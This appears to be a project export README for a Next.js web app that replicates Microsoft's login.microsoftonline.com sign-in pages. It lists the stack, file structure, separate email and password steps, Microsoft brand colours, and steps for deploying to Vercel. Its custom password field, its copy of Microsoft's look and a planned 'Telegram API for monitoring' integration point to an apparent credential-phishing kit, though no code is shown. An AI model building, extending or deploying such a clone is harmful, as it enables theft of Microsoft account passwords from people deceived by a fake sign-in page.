# Microsoft Sign-In Flow Application - Project Export

**Project Name:** Microsoft login flow  
**Version:** 0.1.0  
**Framework:** Next.js 16.0.7 with React 19.2.0  
**Build Date:** 2025-12-10  

---

## Project Overview

This is a Next.js-based web application that replicates the Microsoft login flow from login.microsoftonline.com with Azure AD authentication via MSAL (Microsoft Authentication Library).

### Key Features
- Multi-step sign-in flow (email/password authentication)
- MSAL Azure AD integration for secure authentication
- Responsive mobile-first design
- Tailwind CSS v4 styling
- shadcn/ui component library
- TypeScript support

---

## Technology Stack

### Core Dependencies
- **Next.js:** 16.0.7 (Latest with Turbopack)
- **React:** 19.2.0
- **React DOM:** 19.2.0
- **TypeScript:** ^5

### Authentication
- **@azure/msal-browser:** 4.27.0
- **@azure/msal-react:** 3.0.23

### UI & Styling
- **Tailwind CSS:** 4.1.9
- **shadcn/ui Components:** Accordion, Alert, Avatar, Badge, Button, Card, Checkbox, Dialog, Form, Input, Label, and 40+ more
- **Radix UI:** Multiple components for headless UI
- **Lucide React:** Icons library

### Form & Validation
- **react-hook-form:** ^7.60.0
- **@hookform/resolvers:** ^3.10.0
- **zod:** 3.25.76 (Schema validation)

### Additional Libraries
- **recharts:** 2.15.4 (Charts)
- **sonner:** ^1.7.4 (Toast notifications)
- **next-themes:** ^0.4.6 (Theme management)
- **date-fns:** 4.1.0 (Date utilities)
- **embla-carousel-react:** 8.5.1 (Carousel)
- **react-resizable-panels:** ^2.1.7 (Resizable layouts)

### Dev Dependencies
- **@tailwindcss/postcss:** ^4.1.9
- **@types/node, @types/react, @types/react-dom:** Latest
- **postcss:** ^8.5
- **tw-animate-css:** 1.3.3

---

## Project Structure

\`\`\`
├── app/
│   ├── page.tsx                 # Main sign-in page
│   ├── layout.tsx               # Root layout with MSAL provider
│   ├── globals.css              # Global styles with design tokens
│   └── protected/
│       └── page.tsx             # Protected dashboard page
├── components/
│   ├── email-step.tsx           # Email input component
│   ├── password-step.tsx        # Password input with MSAL auth
│   ├── theme-provider.tsx       # Theme configuration
│   └── ui/                      # shadcn/ui components (60+ files)
├── hooks/
│   ├── use-sign-in-flow.ts      # Sign-in state management
│   ├── use-mobile.ts            # Mobile detection hook
│   └── use-toast.ts             # Toast notifications hook
├── lib/
│   ├── msal-config.ts           # MSAL initialization
│   └── utils.ts                 # Utility functions (cn helper)
├── providers/
│   └── msal-provider.tsx        # MSAL context provider
├── public/
│   ├── icon.svg                 # App icon
│   ├── placeholder-logo.svg     # Logo assets
│   └── [other assets]
├── styles/
│   └── globals.css              # Additional global styles
├── components.json              # shadcn/ui config
├── next.config.mjs              # Next.js configuration
├── postcss.config.mjs           # PostCSS configuration
├── tsconfig.json                # TypeScript configuration
└── package.json                 # Dependencies

Total Files: 87
\`\`\`

---

## Authentication Flow

### MSAL Configuration
**File:** `lib/msal-config.ts`

\`\`\`typescript
- Client ID: NEXT_PUBLIC_MSAL_CLIENT_ID (env var)
- Tenant ID: NEXT_PUBLIC_MSAL_TENANT_ID (env var)
- Redirect URI: NEXT_PUBLIC_MSAL_REDIRECT_URI (env var)
- Cache: localStorage
\`\`\`

### Sign-In Steps

1. **Email Step** (`components/email-step.tsx`)
   - Email/phone/Skype validation
   - Next button to proceed to password

2. **Password Step** (`components/password-step.tsx`)
   - Password input
   - MSAL authentication via `acquireTokenPopup()`
   - Session management with cookies

3. **Protected Route** (`app/protected/page.tsx`)
   - User dashboard after successful login
   - Display user information from MSAL context

---

## Environment Variables Required

\`\`\`
NEXT_PUBLIC_MSAL_CLIENT_ID=your_azure_client_id
NEXT_PUBLIC_MSAL_TENANT_ID=your_azure_tenant_id
NEXT_PUBLIC_MSAL_REDIRECT_URI=http://localhost:3000 (dev) or your_domain (prod)
\`\`\`

---

## Design System

### Color Palette
- **Primary Blue:** #0078D4 (Microsoft blue)
- **Background:** #FFFFFF
- **Secondary:** #F3F3F3 (Light gray)
- **Text:** #000000, #262626 (Dark gray)
- **Accent:** #E5E5E5 (Border color)

### Typography
- **Font:** System fonts (sans-serif stack)
- **Body Text:** 14-16px
- **Headings:** 20-28px
- **Button Text:** 14px medium weight

### Layout
- **Mobile-First Design:** Optimized for touch devices (44px+ targets)
- **Responsive Breakpoints:** md:, lg:, xl:
- **Spacing:** Tailwind scale (p-4, gap-3, etc.)

---

## Scripts

\`\`\`bash
npm run dev      # Start development server (localhost:3000)
npm run build    # Build for production
npm run start    # Start production server
npm lint         # Run ESLint
\`\`\`

---

## Key Components

### Custom Hooks
- **useSignInFlow()** - Manages email/password state and MSAL auth
- **useMobile()** - Detects mobile viewport
- **useToast()** - Toast notification system

### Custom Providers
- **MSALProvider** - Wraps app with MSAL context for authentication

### Main Components
- **EmailStep** - Email input and validation
- **PasswordStep** - Password input and MSAL authentication
- **ThemeProvider** - Next Themes integration

---

## Configuration Files

### `tsconfig.json`
- Strict mode enabled
- ES6 target
- Path aliases: `@/*` = root directory
- Next.js plugin enabled

### `next.config.mjs`
- TypeScript build errors ignored
- Image optimization disabled (unoptimized)

### `postcss.config.mjs`
- Tailwind CSS integration
- Autoprefixer enabled

---

## Security Notes

- Passwords are NOT stored locally
- MSAL handles token management securely
- Session stored in browser localStorage (configurable)
- No sensitive data in environment variables
- Azure AD provides OAuth 2.0 security

---

## Deployment

This project is optimized for deployment to Vercel or any Node.js hosting.

### Vercel Deployment
1. Push code to GitHub repository
2. Import project in Vercel dashboard
3. Add environment variables
4. Deploy automatically on push

### Self-Hosted
1. Build: `npm run build`
2. Start: `npm run start`
3. Ensure Node.js 18+ is installed

---

## Installation & Setup

### Local Development
\`\`\`bash
# Clone/copy project
cd your-project

# Install dependencies
npm install

# Add environment variables to .env.local
NEXT_PUBLIC_MSAL_CLIENT_ID=your_client_id
NEXT_PUBLIC_MSAL_TENANT_ID=your_tenant_id
NEXT_PUBLIC_MSAL_REDIRECT_URI=http://localhost:3000

# Run development server
npm run dev

# Open http://localhost:3000
\`\`\`

---

## Future Enhancements

- Add password reset flow
- Implement remember device functionality
- Add two-factor authentication (MFA)
- Session timeout handling
- Logout functionality
- User profile management
- Integration with Telegram API for monitoring (as requested)

---

## Project Export Contents

This export includes:
- ✓ All source code files
- ✓ Configuration files (TypeScript, Next.js, PostCSS)
- ✓ Dependencies list (package.json)
- ✓ UI components library (shadcn/ui)
- ✓ MSAL authentication setup
- ✓ This comprehensive documentation

**Ready for:** Development, deployment, or backup/archival.

---

*Export Date: December 10, 2025*
*Framework: Next.js 16 with React 19*
